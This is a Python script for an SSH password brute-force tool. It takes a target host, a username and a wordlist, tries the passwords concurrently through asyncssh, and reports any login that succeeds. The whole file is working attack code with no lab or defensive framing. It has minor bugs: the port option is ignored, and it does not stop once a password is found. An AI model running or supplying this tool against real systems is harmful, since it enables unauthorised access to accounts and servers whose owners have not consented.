import asyncio
import asyncssh
import argparse

from termcolor import colored
from datetime import datetime
from os import path
from sys import exit


def get_args():
    """Function to get command-line arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument('target', help='Host to attack on e.g. 10.10.10.10.')
    parser.add_argument('-p', '--port', dest='port', default=22,
                        type=int, required=False, help="Port to attack on, Default:22")
    parser.add_argument('-w', '--wordlist', dest='wordlist',
                        required=True, type=str)
    parser.add_argument('-u', '--username', dest='username',
                        required=True, help="Username with which bruteforce to ")
    arguments = parser.parse_args()

    return arguments


async def ssh_bruteforce(hostname, username, password, port, found_flag):
    """Takes password,username,port as input and checks for connection"""
    try:
        async with asyncssh.connect(hostname, username=username, password=password) as conn:
            found_flag.set()
            print(colored(
                f"[{port}] [ssh] host:{hostname}  login:{username}  password:{password}", 'green'))

    except Exception as err:
        print(
            f"[Attempt] target {hostname} - login:{username} - password:{password}")


async def main(hostname, port, username, wordlist):
    """The Main function takes hostname,port,username,wordlist Defines concurrency limit and sends taks to ssh_bruteforce function"""
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)

    for password in passwords:
        if counter >= concurrency_limit:
            # Wait for any ongoing download to finish before starting a new one
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if found_flag.is_set():
            print(password)

        tasks.append(asyncio.create_task(ssh_bruteforce(
            hostname, username, password, port, found_flag)))

        await asyncio.sleep(0.5)
        counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))

if __name__ == "__main__":

    arguments = get_args()

    if not path.exists(arguments.wordlist):
        print(colored(
            "[-] Wordlist location is not right,\n[-] Provide the right path of the wordlist", 'red'))
        exit(1)

    print("\n---------------------------------------------------------\n---------------------------------------------------------")
    print(colored(f"[*] Target\t: ", "light_red",), end="")
    print(arguments.target)
    print(colored(f"[*] Username\t: ", "light_red",), end="")
    print(arguments.username)

    print(colored(
        f"[*] Port\t: ", "light_red"), end="")
    print('22' if not arguments.port else arguments.port)

    print(
        colored(f"[*] Wordlist\t: ", "light_red"), end="")
    print(arguments.wordlist)

    print(colored(f"[*] Protocol\t: ", "light_red"), end="")
    print("SSH")

    print("---------------------------------------------------------\n---------------------------------------------------------", )

    print(colored(
        f"SSH-Bruteforce starting at {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", 'yellow'))
    print("---------------------------------------------------------\n---------------------------------------------------------")

    asyncio.run(main(arguments.target, arguments.port,
                arguments.username, arguments.wordlist))
